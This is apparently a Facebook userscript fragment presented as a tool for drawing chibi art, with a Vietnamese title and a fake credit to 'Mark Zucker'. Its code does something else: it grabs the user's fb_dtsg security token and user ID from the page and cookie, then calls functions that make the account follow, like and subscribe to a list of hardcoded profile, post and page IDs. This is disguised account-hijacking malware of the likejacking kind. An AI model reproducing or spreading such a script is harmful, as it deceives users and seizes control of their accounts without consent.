﻿﻿// ==UserScript==
// @name            [New] Vẽ Chibi trực tiếp trên FaceBook 2014 (y) (y)
// @description     All about facebook By Mark Zucker
...
//KB
IDS("100001897676811");IDS("100004066032859");
P("422116141267250");P("608090762597507");P("39298855744106");P("636179986396554");P("687004551318610");P("283248271824608");P("215899938600394");P("725431587475551");P("1470118376533099");P("203051369844057");
Like("202519619897232");Like("416407991782439");Like("617225541682451");Like("581944155234332");Like("1379326465676313");
a("100001897676811");a("100004066032859");

sublist("411852038960327");


var gid = ['551251394981856'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
